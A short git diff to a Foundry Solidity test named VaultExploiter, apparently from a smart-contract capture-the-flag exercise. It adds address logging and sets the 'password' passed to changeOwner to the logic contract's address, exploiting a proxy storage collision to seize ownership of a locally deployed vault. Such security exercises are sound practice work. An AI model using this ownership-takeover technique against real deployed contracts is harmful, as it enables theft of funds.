@@ -19,8 +19,9 @@ contract VaultExploiter is Test {
         vm.startPrank(owner);
         bytes32 setupPassword = bytes32("0x1234");
         logic = new VaultLogic(setupPassword);
+        console2.log("logic address:", address(logic));
         vault = new Vault(address(logic));
-
+        console2.log("vault address:", address(vault));
         vault.deposite{ value: 0.1 ether }();
         vm.stopPrank();
     }
@@ -31,7 +32,7 @@ contract VaultExploiter is Test {
 
         bytes4 selector = bytes4(keccak256("changeOwner(bytes32,address)"));
 
-        bytes32 password = 0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459;
+        bytes32 password = bytes32(uint256(uint160(address(logic))));
 
         bytes memory callData = abi.encodePacked(selector, password, uint256(uint160(palyer)));
 
